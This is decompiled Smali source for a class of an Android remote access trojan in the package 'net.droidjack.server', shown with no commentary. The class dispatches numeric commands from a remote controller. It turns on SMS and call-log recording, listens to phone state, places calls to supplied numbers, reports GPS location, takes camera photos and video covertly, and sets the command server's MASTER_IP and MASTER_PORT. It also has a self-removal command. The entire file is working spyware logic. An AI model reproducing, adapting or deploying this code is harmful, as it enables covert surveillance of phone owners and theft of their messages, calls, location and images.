.class public Lnet/droidjack/server/l;
.super Ljava/lang/Object;


# direct methods
.method protected static declared-synchronized a(Ljava/lang/String;[Ljava/lang/String;)[B
    .locals 2

    const-class v1, Lnet/droidjack/server/l;

    monitor-enter v1

    :try_start_0
    invoke-static {p0, p1}, Lnet/droidjack/server/l;->b(Ljava/lang/String;[Ljava/lang/String;)[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result-object v0

    :goto_0
    monitor-exit v1

    return-object v0

    :catch_0
    move-exception v0

    :try_start_1
    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "Nack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-result-object v0

    goto :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method private static declared-synchronized b(Ljava/lang/String;[Ljava/lang/String;)[B
    .locals 7

    const/4 v2, 0x0

    const-class v3, Lnet/droidjack/server/l;

    monitor-enter v3

    :try_start_0
    invoke-static {p0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v4, 0x4

    new-array v4, v4, [I

    fill-array-data v4, :array_0

    array-length v5, v4

    :goto_0
    if-lt v2, v5, :cond_0

    :goto_1
    sparse-switch v1, :sswitch_data_0

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result-object v0

    :goto_2
    monitor-exit v3

    return-object v0

    :cond_0
    :try_start_1
    aget v6, v4, v2

    if-ne v6, v1, :cond_1

    const/16 v1, 0x3e7

    goto :goto_1

    :cond_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :sswitch_0
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_2

    :sswitch_1
    sget-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    invoke-virtual {v0}, Lnet/droidjack/server/bf;->a()[B

    move-result-object v0

    goto :goto_2

    :sswitch_2
    sget-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    invoke-virtual {v0}, Lnet/droidjack/server/bf;->c()[B

    move-result-object v0

    goto :goto_2

    :sswitch_3
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/m;

    invoke-direct {v1}, Lnet/droidjack/server/m;-><init>()V

    const-wide/16 v4, 0xfa0

    invoke-virtual {v0, v1, v4, v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_2

    :sswitch_4
    sget-object v0, Lnet/droidjack/server/Controller;->r:Lnet/droidjack/server/cf;

    invoke-virtual {v0}, Lnet/droidjack/server/cf;->a()[B

    move-result-object v0

    goto :goto_2

    :sswitch_5
    sget-object v0, Lnet/droidjack/server/Controller;->r:Lnet/droidjack/server/cf;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/cf;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_6
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_7
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_8
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->f(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_9
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->c(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_a
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->e(Ljava/lang/String;)[B

    move-result-object v0

    goto :goto_2

    :sswitch_b
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->d(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_c
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->g(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_d
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->h(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_e
    sget-object v0, Lnet/droidjack/server/Controller;->a:Lnet/droidjack/server/am;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/am;->i(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_f
    sget-boolean v0, Lnet/droidjack/server/bt;->b:Z

    if-nez v0, :cond_3

    sget-boolean v0, Lnet/droidjack/server/bt;->a:Z

    if-nez v0, :cond_2

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    sget-object v4, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0, v1, v2, v4}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    :cond_2
    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/bt;->b:Z

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "SMS_RECORDING"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_10
    sget-boolean v0, Lnet/droidjack/server/bt;->b:Z

    if-eqz v0, :cond_5

    sget-boolean v0, Lnet/droidjack/server/bt;->a:Z

    if-nez v0, :cond_4

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    sget-object v1, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    :cond_4
    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/bt;->b:Z

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "SMS_RECORDING"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_5
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_11
    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ah;->a(I)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_12
    const/4 v0, 0x0

    aget-object v0, p1, v0

    if-eqz v0, :cond_6

    const/4 v0, 0x0

    aget-object v0, p1, v0

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    :cond_6
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    const-string v1, ""

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bt;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :cond_7
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bt;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_13
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0}, Lnet/droidjack/server/bt;->d()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_14
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0}, Lnet/droidjack/server/bt;->b()V

    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0}, Lnet/droidjack/server/bt;->a()V

    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    invoke-virtual {v0}, Lnet/droidjack/server/bt;->c()V

    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ah;->a(I)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_15
    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_16
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bt;->c(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_17
    sget-object v0, Lnet/droidjack/server/Controller;->b:Lnet/droidjack/server/bt;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bt;->d(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_18
    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    sget-object v1, Lnet/droidjack/server/Controller;->c:Lnet/droidjack/server/CallListener;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v4, "android.intent.action.PHONE_STATE"

    invoke-direct {v2, v4}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/CallListener;->b:Z

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_19
    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    sget-object v1, Lnet/droidjack/server/Controller;->c:Lnet/droidjack/server/CallListener;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/CallListener;->b:Z

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1a
    sget-object v0, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    invoke-virtual {v0}, Lnet/droidjack/server/f;->a()V

    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ah;->a(I)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1b
    sget-boolean v0, Lnet/droidjack/server/f;->a:Z

    if-nez v0, :cond_8

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x1

    sget-object v4, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    invoke-virtual {v0, v1, v2, v4}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/f;->a:Z

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "CALL_LOG_RECORDING"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_8
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1c
    sget-boolean v0, Lnet/droidjack/server/f;->a:Z

    if-eqz v0, :cond_9

    sget-object v0, Lnet/droidjack/server/Controller;->d:Landroid/content/ContentResolver;

    sget-object v1, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/f;->a:Z

    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "CALL_LOG_RECORDING"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_9
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1d
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "tel:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.CALL"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v1, v0}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    sget-object v0, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1e
    sget-object v0, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/f;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_1f
    sget-object v0, Lnet/droidjack/server/Controller;->h:Lnet/droidjack/server/f;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/f;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_20
    sget-object v0, Lnet/droidjack/server/Controller;->f:Lnet/droidjack/server/q;

    invoke-virtual {v0}, Lnet/droidjack/server/q;->a()V

    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ah;->a(I)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_21
    sget-object v0, Lnet/droidjack/server/Controller;->f:Lnet/droidjack/server/q;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/q;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_22
    sget-object v0, Lnet/droidjack/server/Controller;->f:Lnet/droidjack/server/q;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/q;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_23
    sget-object v0, Lnet/droidjack/server/Controller;->j:Lnet/droidjack/server/GPSLocation;

    invoke-virtual {v0}, Lnet/droidjack/server/GPSLocation;->a()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_24
    sget-object v0, Lnet/droidjack/server/Controller;->j:Lnet/droidjack/server/GPSLocation;

    invoke-virtual {v0}, Lnet/droidjack/server/GPSLocation;->b()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_25
    sget-object v0, Lnet/droidjack/server/Controller;->k:Lnet/droidjack/server/bn;

    invoke-virtual {v0}, Lnet/droidjack/server/bn;->a()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_26
    sget-object v0, Lnet/droidjack/server/Controller;->k:Lnet/droidjack/server/bn;

    invoke-virtual {v0}, Lnet/droidjack/server/bn;->b()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_27
    sget-object v0, Lnet/droidjack/server/Controller;->k:Lnet/droidjack/server/bn;

    invoke-virtual {v0}, Lnet/droidjack/server/bn;->c()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_28
    sget-object v0, Lnet/droidjack/server/Controller;->k:Lnet/droidjack/server/bn;

    invoke-virtual {v0}, Lnet/droidjack/server/bn;->d()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_29
    const/4 v0, 0x0

    aget-object v0, p1, v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lnet/droidjack/server/n;

    invoke-direct {v2, v0}, Lnet/droidjack/server/n;-><init>(Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2a
    sget-object v0, Lnet/droidjack/server/Controller;->f:Lnet/droidjack/server/q;

    invoke-virtual {v0}, Lnet/droidjack/server/q;->a()V

    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    invoke-virtual {v0}, Lnet/droidjack/server/ah;->a()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2b
    sget-object v0, Lnet/droidjack/server/Controller;->m:Lnet/droidjack/server/b;

    invoke-virtual {v0}, Lnet/droidjack/server/b;->a()V

    sget-object v0, Lnet/droidjack/server/Controller;->e:Lnet/droidjack/server/ah;

    const/4 v1, 0x5

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ah;->a(I)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2c
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "MASTER_IP"

    const/4 v2, 0x0

    aget-object v2, p1, v2

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2d
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "MASTER_PORT"

    const/4 v2, 0x0

    aget-object v2, p1, v2

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2e
    sget-object v0, Lnet/droidjack/server/Controller;->l:Lnet/droidjack/server/ca;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/ca;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_2f
    sget-object v0, Lnet/droidjack/server/Controller;->p:Lnet/droidjack/server/bz;

    invoke-virtual {v0}, Lnet/droidjack/server/bz;->a()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_30
    sget-object v0, Lnet/droidjack/server/Controller;->p:Lnet/droidjack/server/bz;

    invoke-virtual {v0}, Lnet/droidjack/server/bz;->b()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_31
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "MASTER_IP"

    const-string v2, "DJ_GooDbYe:("

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    new-instance v1, Lnet/droidjack/server/p;

    invoke-direct {v1}, Lnet/droidjack/server/p;-><init>()V

    const-wide/16 v4, 0xfa0

    invoke-virtual {v0, v1, v4, v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_32
    sget-object v0, Lnet/droidjack/server/Controller;->p:Lnet/droidjack/server/bz;

    invoke-virtual {v0}, Lnet/droidjack/server/bz;->c()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_33
    sget-object v0, Lnet/droidjack/server/Controller;->n:Lnet/droidjack/server/a;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/a;->b(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_34
    sget-object v0, Lnet/droidjack/server/Controller;->n:Lnet/droidjack/server/a;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/a;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_35
    sget-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    invoke-virtual {v0}, Lnet/droidjack/server/bf;->h()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_36
    sget-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    invoke-virtual {v0}, Lnet/droidjack/server/bf;->g()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_37
    sget-object v0, Lnet/droidjack/server/Controller;->q:Lnet/droidjack/server/bf;

    const/4 v1, 0x0

    aget-object v1, p1, v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/bf;->a(Ljava/lang/String;)[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_38
    new-instance v1, Landroid/content/Intent;

    sget-object v2, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    const-class v4, Lnet/droidjack/server/CamSnapDJ;

    invoke-direct {v1, v2, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "Camtype"

    const/4 v4, 0x0

    aget-object v4, p1, v4

    invoke-virtual {v1, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "Quality"

    const/4 v4, 0x1

    aget-object v4, p1, v4

    invoke-virtual {v1, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v2, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto/16 :goto_2

    :catchall_0
    move-exception v0

    monitor-exit v3

    throw v0

    :sswitch_39
    :try_start_2
    new-instance v1, Landroid/content/Intent;

    sget-object v2, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    const-class v4, Lnet/droidjack/server/VideoCapDJ;

    invoke-direct {v1, v2, v4}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "Camtype"

    const/4 v4, 0x0

    aget-object v4, p1, v4

    invoke-virtual {v1, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "Quality"

    const/4 v4, 0x1

    aget-object v4, p1, v4

    invoke-virtual {v1, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "RecTime"

    const/4 v4, 0x2

    aget-object v4, p1, v4

    invoke-virtual {v1, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v2, Lnet/droidjack/server/Controller;->s:Landroid/content/Context;

    invoke-virtual {v2, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_2

    :sswitch_3a
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "mobiledataphno"

    const/4 v2, 0x0

    aget-object v2, p1, v2

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto/16 :goto_2

    :sswitch_3b
    sget-object v0, Lnet/droidjack/server/Controller;->g:Lnet/droidjack/server/by;

    const-string v1, "wifiphno"

    const/4 v2, 0x0

    aget-object v2, p1, v2

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    move-result-object v0

    goto/16 :goto_2

    nop

    :array_0
    .array-data 4
        0x3e4
        0x3e5
        0x3e6
        0x3e7
    .end array-data

    :sswitch_data_0
    .sparse-switch
        0x0 -> :sswitch_0
        0x1 -> :sswitch_1
        0x2 -> :sswitch_2
        0x3 -> :sswitch_3
        0x4 -> :sswitch_5
        0x5 -> :sswitch_4
        0x14 -> :sswitch_6
        0x15 -> :sswitch_7
        0x16 -> :sswitch_8
        0x17 -> :sswitch_9
        0x18 -> :sswitch_b
        0x19 -> :sswitch_c
        0x1a -> :sswitch_a
        0x1b -> :sswitch_d
        0x1c -> :sswitch_e
        0x28 -> :sswitch_f
        0x29 -> :sswitch_10
        0x2a -> :sswitch_11
        0x2b -> :sswitch_12
        0x2c -> :sswitch_13
        0x2d -> :sswitch_14
        0x2e -> :sswitch_15
        0x2f -> :sswitch_16
        0x30 -> :sswitch_17
        0x3c -> :sswitch_18
        0x3d -> :sswitch_19
        0x3e -> :sswitch_1a
        0x3f -> :sswitch_1b
        0x40 -> :sswitch_1c
        0x41 -> :sswitch_1d
        0x42 -> :sswitch_1e
        0x43 -> :sswitch_1f
        0x50 -> :sswitch_20
        0x51 -> :sswitch_21
        0x52 -> :sswitch_22
        0x5a -> :sswitch_25
        0x5b -> :sswitch_26
        0x5c -> :sswitch_27
        0x5d -> :sswitch_28
        0x64 -> :sswitch_38
        0x65 -> :sswitch_39
        0x6e -> :sswitch_2b
        0x78 -> :sswitch_33
        0x79 -> :sswitch_34
        0x82 -> :sswitch_2a
        0x8c -> :sswitch_29
        0x96 -> :sswitch_23
        0x97 -> :sswitch_24
        0xa0 -> :sswitch_3a
        0xa1 -> :sswitch_3b
        0xaa -> :sswitch_2c
        0xab -> :sswitch_2d
        0xac -> :sswitch_2e
        0xad -> :sswitch_2f
        0xae -> :sswitch_30
        0xaf -> :sswitch_31
        0xb0 -> :sswitch_32
        0xbe -> :sswitch_35
        0xbf -> :sswitch_36
        0xc0 -> :sswitch_37
    .end sparse-switch
.end method
